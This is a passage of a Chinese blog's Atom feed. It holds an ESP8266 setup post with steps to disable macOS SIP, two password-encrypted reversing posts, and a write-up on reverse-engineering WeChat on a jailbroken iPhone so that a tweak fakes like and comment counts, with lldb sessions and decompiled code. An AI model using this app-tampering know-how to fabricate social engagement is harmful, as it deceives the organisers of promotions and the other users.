href="https://github.com/adrianmihalko/ch340g-ch34g-ch34x-mac-os-x-driver">https://github.com/adrianmihalko/ch340g-ch34g-ch34x-mac-os-x-driver</a></p><p>CH340G CH34G CH34X Mac OS X driver</p></li><li><p><a href="http://www.nodemcu.com" target="_blank" rel="external">http://www.nodemcu.com</a></p><p>资料下载访问官网</p></li><li><p><a href="https://pan.baidu.com/s/1ZCjaSJLNpQWL7CPOpkH-dg" target="_blank" rel="external">https://pan.baidu.com/s/1ZCjaSJLNpQWL7CPOpkH-dg</a></p><p>NODEMCU资料</p></li><li><p><a href="http://www.wch.cn/download/CH341SER_MAC_ZIP.html" target="_blank" rel="external">http://www.wch.cn/download/CH341SER_MAC_ZIP.html</a></p><p>mac串口驱动下载地址</p></li><li><p><a href="https://freeware.the-meiers.org/" target="_blank" rel="external">https://freeware.the-meiers.org/</a></p><p>CoolTerm串口监控工具下载</p></li><li><p>SIP禁用步骤</p><pre><code>1. 重启mac，在出现苹果标志和进度条的时候按住 cmd+r2. 终端中输入csrutil disable/status/enabled3. 重启mac</code></pre></li></ul><h4 id="上手实践"><a href="#上手实践" class="headerlink" title="上手实践"></a>上手实践</h4><p>下面我们就来熟悉一下这个系统，包括代码环境，编译环境，常见库，开发相关。还是以一些demo代码作为学习。</p><p>待续…</p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><p><a href="https://blog.csdn.net/iotisan/article/details/78766463" target="_blank" rel="external">https://blog.csdn.net/iotisan/article/details/78766463</a></p><p>和ESP8266 Arduino谈场恋爱 01 一条具有中国特色的开发环境安装道路</p></li><li><p><a href="https://www.reddit.com/r/arduino/comments/9jlz5g/any_nodemcu_esp8266_drivers_for_macos_mojave/" target="_blank" rel="external">https://www.reddit.com/r/arduino/comments/9jlz5g/any_nodemcu_esp8266_drivers_for_macos_mojave/</a></p><p>Any NodeMCU esp8266 Drivers for MacOS Mojave?</p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;Arduino-ESP8266开发板上手实践&quot;&gt;&lt;a href=&quot;#Arduino-ESP8266开发板上手实践&quot; class=&quot;headerlink&quot; title=&quot;Arduino ESP8266开发板上手实践&quot;&gt;&lt;/a&gt;Arduino ESP8266开发板上手
      
    
    </summary>
    
      <category term="IOT" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/IOT/"/>
    
    
      <category term="Arduino" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Arduino/"/>
    
      <category term="IOT" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/IOT/"/>
    
  </entry>
  
  <entry>
    <title>Electron跨平台App实战分析</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/29/Electron-app-reversing/Electron-app-reversing/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/29/Electron-app-reversing/Electron-app-reversing/</id>
    <published>2019-07-29T03:59:49.000Z</published>
    <updated>2019-07-29T14:45:34.468Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">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</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/RE/"/>
    
    
      <category term="Electron" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Electron/"/>
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/RE/"/>
    
  </entry>
  
  <entry>
    <title>Android完全禁用Accessibility（通杀一切基于此的外挂）</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/24/android-disableAccessibility/android-disableAccessibility/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/24/android-disableAccessibility/android-disableAccessibility/</id>
    <published>2019-07-24T12:02:54.000Z</published>
    <updated>2019-07-30T07:52:20.330Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/RE/"/>
    
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/RE/"/>
    
      <category term="Accessibility" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Accessibility/"/>
    
  </entry>
  
  <entry>
    <title>微信集赞/评论插件分析及开发</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/22/fkwechatLike/fkwechatLike/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/22/fkwechatLike/fkwechatLike/</id>
    <published>2019-07-22T02:22:01.000Z</published>
    <updated>2019-07-28T13:58:12.611Z</updated>
    
    <content type="html"><![CDATA[<h3 id="微信集赞-评论插件分析及开发"><a href="#微信集赞-评论插件分析及开发" class="headerlink" title="微信集赞/评论插件分析及开发"></a>微信集赞/评论插件分析及开发</h3><h4 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h4><p>为什么要做这个集赞的插件呢？起因是上周去参加了某个会议，有一个集赞60领玩偶的活动，但是想到平时一条朋友圈也就几个赞，而且又不想找人点赞，领不到，很气。回去以后想着能不能写一个集赞的插件，在需要的时候直接输入想要的赞、评论数量，我发的朋友圈就能有多少赞。这样再有这样的活动岂不美哉。准备开干！</p><h4 id="理性分析"><a href="#理性分析" class="headerlink" title="理性分析"></a>理性分析</h4><p>再开始之前，先理性分析一波：如果想要集赞，这里有两种思路，一个是直接在view层去更改，但是这样得去处理界面的一些细节，一旦不注意，很容易崩溃。还有种思路是更改datasource或者说赞评论的模型。可以想到，最初一条朋友圈肯定是从服务器拿到数据并封装成对应的模型。一般来说，越改底层的数据或者说源头的数据，那么稳定性和真实性就更高。这里我的想法就是既不改view层，也不改源头层，就改封装好的模型那一层应该就很符合要求。接下来主要讲一下怎么我去实现这个需求的分析过程，因为本身功能不是很复杂，大佬随便看看就行。</p><h4 id="准备条件"><a href="#准备条件" class="headerlink" title="准备条件"></a>准备条件</h4><ul><li>一台mac</li><li>一台越狱的iOS设备</li><li>ida/Hooper/theos</li><li>flex/issh/xia0LLDB</li><li>其他常见逆向工具等</li></ul><p>对于一贯喜欢上调试器分析得我，所以写了<a href="https://github.com/4ch12dy/issh">iSSH</a>和<a href="https://github.com/4ch12dy/xia0LLDB">xia0LLDB</a>两个工具，在这两个工具的辅助下整个插件用了2小时就完成了逆向分析和代码实现。</p><h4 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h4><h5 id="逆向赞和评论的数据模型"><a href="#逆向赞和评论的数据模型" class="headerlink" title="逆向赞和评论的数据模型"></a>逆向赞和评论的数据模型</h5><p>一切从界面入手，这里分析界面我一般喜欢用flex，在微信的朋友圈界面，用flex很容易发现当前界面的控制器为<code>WCTimeLineViewController</code>而且界面是一个<code>UITableView</code></p><p>将wechat执行文件拖入Hooper（<del>wechat文件太大，ida分析会很卡</del>）找到UITableView的代理方法：<br><code>-[WCTimeLineViewController tableView:cellForRowAtIndexPath:]</code></p><p>这里面肯定会根据模型去设置cell数据</p><pre><code class="objective-c">  r2 = [r28 section];  var_70 = r25;  r24 = [r25 calcDataItemIndex:r2];  r25 = [[MMServiceCenter defaultCenter] retain];  r2 = [WCFacade class];  var_78 = r28;  r0 = [r25 getService:r2];  r0 = [r0 retain];  r24 = [[r0 getTimelineDataItemOfIndex:r24] retain];  [r0 release];  [r25 release];  r19 = [[MMServiceCenter defaultCenter] retain];  r0 = [r19 getService:[WCFacade class]];  r0 = [r0 retain];  r25 = [[r0 getLayerIdForDataItem:r24] retain];  [r0 release];  [r19 release];  r19 = [[MMServiceCenter defaultCenter] retain];  r0 = [r19 getService:[WCFacade class]];  r0 = [r0 retain];  r20 = r0;  r0 = [r0 getShowTip:r24 layerId:r25];  r29 = r29;  r26 = [r0 retain];  [r20 release];  [r19 release];</code></pre><p>整理下来就是</p><p><code>[[MMServiceCenter defaultCenter] getService:[WCFacade class]]</code>会得到一个<code>WCFacade</code>对象，然后通过</p><p><code>[WCFacade getTimelineDataItemOfIndex:]</code>就能得到cell的数据</p><p>看到这里，上调试器！看下都是什么数据…</p><p>将设备用数据线连接上电脑（这里我推荐用数据线的方式，wifi延时太高，影响心情），手机上打开微信</p><p>直接输入<code>issh debug -a wechat</code>就能挂上微信</p><pre><code class="shell">xia0 ~ $ issh debug -a wechat[I]:iproxy process for 2222 port alive, pid=1382[I]:++++++++++++++++++ Nice to Work :) +++++++++++++++++++++[I]:iOSRE dir exist[I]:iproxy process for 1234 port alive, pid=1395[I]:Run ps -e | grep debugserver | grep -v grep; [[ 0 == 0 ]] &amp;&amp; (killall -9 debugserver 2&gt; /dev/null)[I]:/iOSRE/tools/debugserver file exist, Start debug...[I]:Run /iOSRE/tools/debugserver 127.0.0.1:1234 -a wechat</code></pre><p>打开另一个终端进行调试（我的lldb已经安装了xia0LLDB脚本）</p><pre><code>xia0 ~ $ lldb&quot;xutil&quot; command installed -&gt; xutil&quot;choose&quot; command installed -&gt; choose&quot;xbr&quot; command installed --&gt; xbr -[UIView initWithFrame:]&quot;sbt&quot; command installed -&gt; sbt// 连接到远端(lldb) pcc</code></pre><p>这里有两种方法：</p><p>一种是用<code>xbr &quot;-[WCTimeLineViewController tableView:cellForRowAtIndexPath:]&quot;</code>下断点去查看；</p><pre><code>// 对-[WCTimeLineViewController tableView:cellForRowAtIndexPath:]方法下断点(lldb) xbr &quot;-[WCTimeLineViewController tableView:cellForRowAtIndexPath:]&quot;(lldb) c</code></pre><p>第二种是由于lldb支持choose命令，可以直接拿到<code>WCFacade</code>对象。既然如此选choose</p><pre><code>(lldb) choose WCFacade&lt;__NSArrayM 0x2823d9860&gt;(&lt;WCFacade: 0x139e1c030&gt;)</code></pre><p>调用其<code>getTimelineDataItemOfIndex:</code>方法就能拿到第一条朋友圈的数据</p><pre><code>(lldb) po [0x139e1c030 getTimelineDataItemOfIndex:0]Class name: WCDataItem, addr: 0x13e2871d0tid: 13121667995275047007username: wxid_6913ohfkk7kq12createtime: 1564224719commentUsers: ()contentObj: &lt;WCContentItem: 0x2801f5500&gt;</code></pre><p>输入<code>ivars 0x13e2871d0</code>就能拿到对象的所有属性值</p><pre><code>(lldb) ivars 0x13e2871d0&lt;WCDataItem: 0x13e2871d0&gt;:in WCDataItem:    cid (int): 0    tid (NSString*): @&quot;13121667995275047007&quot;    type (int): 0    flag (int): 0    username (NSString*): @&quot;wxid_6913ohfkk7kq12&quot;    nickname (NSString*): @&quot;xia0&quot;    createtime (int): 1564224719    locationInfo (WCLocationInfo*): &lt;WCLocationInfo: 0x2801f7800&gt;    likeFlag (BOOL): NO    likeCount (int): 0    likeUsers (NSMutableArray*): &lt;__NSArrayM: 0x286152d90&gt;    commentCount (int): 0    commentUsers (NSMutableArray*): &lt;__NSArrayM: 0x2861539c0&gt;    contentObj (WCContentItem*): &lt;WCContentItem: 0x2801f5500&gt;    appInfo (WCAppInfo*): &lt;WCAppInfo: 0x287404080&gt;    contentDesc (NSString*): @&quot;test&quot;</code></pre><p>由于属性太多，这里我就只显示了一些比较关心的数据，可以看到这就是我发的一条内容为test的朋友圈。</p><p>里面我们还发现了<code>likeUsers</code>和<code>commentUsers</code>的字段，冷静思考就知道应该就是对应的赞和评论列表。我先给自己点个赞看下里面的数据。</p><pre><code>likeCount (int): 1likeUsers (NSMutableArray*): &lt;__NSArrayM: 0x283e37060&gt;</code></pre><p>发现赞的数量变为1了，在看下里面的内容</p><pre><code>(lldb) po 0x283e37060&lt;__NSArrayM 0x283e37060&gt;(Class name: WCUserCommentusername: wxid_6913ohfkk7kq12nickname: xia0content:source: 0type: 1createTime: 1564225007isLocalAdded: 0commentID: (null)comment64ID: (null)refCommentID: (null)refComment64ID: (null)refUserName:bDeleted: 0)</code></pre><p>正是我自己的微信号。同理可以得到评论</p><pre><code>commentCount (int): 1commentUsers (NSMutableArray*): &lt;__NSArrayM: 0x283e349c0&gt;(lldb) po 0x283e349c0&lt;__NSArrayM 0x283e349c0&gt;(Class name: WCUserCommentusername: wxid_6913ohfkk7kq12nickname: xia0content: 评论测试source: 0type: 2createTime: 1564225144isLocalAdded: 1commentID: (null)comment64ID: (null)refCommentID: (null)refComment64ID: (null)refUserName: (null)bDeleted: 0)</code></pre><p>到这里我们还可以发现赞和评论都是一个类（模型），只是里面的类型字段不同。现在我们其实已经拿到了我们想要的数据模型了。但是还有一个问题在于我们应该什么时候去更改这些数据呢？也就是我们说的hook点。</p><p>最好的hook可以想到是每次刷新数据的时候，这样我们的数据就是最新的。</p><h5 id="寻找HOOK点"><a href="#寻找HOOK点" class="headerlink" title="寻找HOOK点"></a>寻找HOOK点</h5><p>先想一下，刷新数据的时候，当拿到新的数据肯定会封装为一个<code>WCDataItem</code>对象，那么我们可以对<code>WCDataItem</code>里面的方法下断点，然后打印调用链不就反向得到了刷新的函数了吗？</p><p>但是逆向和调试过微信的人都知道，当你使用bt命令的时候只能得到一堆无符号的调用栈像下面这样</p><pre><code>(lldb) bt* thread #1, queue = &#39;com.apple.main-thread&#39;, stop reason = breakpoint 4.1  * frame #0: 0x000000010857d4d0 WeChat`_mcwxh_dydx33_8to8(_VDecStruct*, unsigned char*, unsigned char*, unsigned int, unsigned int, unsigned int, unsigned int) + 30312888    frame #1: 0x0000000194fcc638 Foundation`_decodeObjectBinary + 2004    frame #2: 0x0000000194fcbb6c Foundation`_decodeObject + 340    frame #3: 0x0000000194ed24fc Foundation`-[NSKeyedUnarchiver decodeObjectForKey:] + 228    frame #4: 0x0000000194f2a09c Foundation`+[NSKeyedUnarchiver unarchiveObjectWithData:] + 92    frame #5: 0x0000000105a88404 WeChat`int fmt::internal::CharTraits&lt;char&gt;::format_float&lt;long double&gt;(char*, unsigned long, char const*, unsigned int, int, long double) + 2432992    frame #6: 0x0000000108da9ea8 WeChat`_mcwxh_dydx33_8to8(_VDecStruct*, unsigned char*, unsigned char*, unsigned int, unsigned int, unsigned int, unsigned int) + 38884240    frame #7: 0x0000000108daa890 WeChat`_mcwxh_dydx33_8to8(_VDecStruct*, unsigned char*, unsigned char*, unsigned int, unsigned int, unsigned int, unsigned int) + 38886776    frame #8: 0x0000000108dad178 WeChat`_mcwxh_dydx33_8to8(_VDecStruct*, unsigned char*, unsigned char*, unsigned int, unsigned int, unsigned int, unsigned int) + 38897248    frame #9: 0x0000000108717394 WeChat`_mcwxh_dydx33_8to8(_VDecStruct*, unsigned char*, unsigned char*, unsigned int, unsigned int, unsigned int, unsigned int) + 31991932</code></pre><p>但是用我写的sbt命令就能恢复oc符号，下面我们对<code>-[WCDataItem setCid:]</code>下断点，然后得到调用栈</p><pre><code>(lldb) sbt==========================================xia0LLDB==========================================  BlockSymbolFile    Not Set The Block Symbol Json File, Try &#39;sbt -f&#39;============================================================================================  frame #0: [file:0x103c094d0 mem:0x10857d4d0] WeChat`-[WCDataItem setCid:] + 0  frame #1: [file:0x18193c638 mem:0x194fcc638] Foundation`_decodeObjectBinary + 2004  frame #2: [file:0x18193bb6c mem:0x194fcbb6c] Foundation`_decodeObject + 340  frame #3: [file:0x1818424fc mem:0x194ed24fc] Foundation`-[NSKeyedUnarchiver decodeObjectForKey:] + 228  frame #4: [file:0x18189a09c mem:0x194f2a09c] Foundation`+[NSKeyedUnarchiver unarchiveObjectWithData:] + 92  frame #5: [file:0x101114404 mem:0x105a88404] WeChat`+[CUtility SafeUnarchiveFromData:] + 64  frame #6: [file:0x104435ea8 mem:0x108da9ea8] WeChat`-[WCAdvertiseDataHelper hasCommented:] + 116  frame #7: [file:0x104436890 mem:0x108daa890] WeChat`-[WCAdvertiseDataHelper IsAdvertiseDataValid:] + 48  frame #8: [file:0x104439178 mem:0x108dad178] WeChat`-[WCAdvertiseDataHelper getAdvertiseDataByCurMinTime:MaxTime:] + 552  frame #9: [file:0x103da3394 mem:0x108717394] WeChat`Maybe c function? Distance:3348 &gt;= 2500 # Symbol:-[WCTimelineMgr tryRemoveCachesOfLikeUserWithNewTimelineList:] + 3348  frame #10: [file:0x206a0 mem:0x1131f06a0] WeChat`-[WCTimelineMgr onDataUpdated:andData:andAdData:withChangedTime:] + 233  frame #11: [file:0x103db00c8 mem:0x1087240c8] WeChat`Maybe c function? Distance:9732 &gt;= 2500 # Symbol:-[WCTimelineDataProvider responseForSnsTimeLineResponse:Event:] + 9732  frame #12: [file:0x103db0398 mem:0x108724398] WeChat`-[WCTimelineDataProvider MessageReturn:Event:] + 112  frame #13: [file:0x1033923c0 mem:0x107d063c0] WeChat`-[CAppObserverCenter NotifyFromMainCtrl:Event:] + 336  frame #14: [file:0x104c292f8 mem:0x10959d2f8] WeChat`-[CMainControll TimerCheckEvent] + 728  frame #15: [file:0x1800a3604 mem:0x193733604] libobjc.A.dylib`-[NSObject performSelector:withObject:] + 68  frame #16: [file:0x101cb1fa8 mem:0x106625fa8] WeChat`-[MMNoRetainTimerTarget onNoRetainTimer:] + 84  frame #17: [file:0x1819750bc mem:0x1950050bc] Foundation`__NSFireTimer + 88  frame #18: [file:0x180e3d0a4 mem:0x1944cd0a4] CoreFoundation`__CFRUNLOOP_IS_CALLING_OUT_TO_A_TIMER_CALLBACK_FUNCTION__ + 32  frame #19: [file:0x180e3cdd0 mem:0x1944ccdd0] CoreFoundation`__CFRunLoopDoTimer + 884  frame #20: [file:0x180e3c5c4 mem:0x1944cc5c4] CoreFoundation`__CFRunLoopDoTimers + 252  frame #21: [file:0x180e37284 mem:0x1944c7284] CoreFoundation`__CFRunLoopRun + 1832  frame #22: [file:0x180e36844 mem:0x1944c6844] CoreFoundation`CFRunLoopRunSpecific + 452  frame #23: [file:0x1830e5be8 mem:0x196775be8] GraphicsServices`GSEventRunModal + 104  frame #24: [file:0x1ae78431c mem:0x1c1e1431c] UIKitCore`UIApplicationMain + 216  frame #25: [file:0x100152b04 mem:0x104ac6b04] WeChat`main + 1387268  frame #26: [file:0x1808ec020 mem:0x193f7c020] libdyld.dylib`start + 4</code></pre><p>可以看到调用栈的符号已经恢复了，能够清晰的看出调用的过程</p><p>其中里面有个很明显的方法</p><p><code>-[WCTimelineMgr 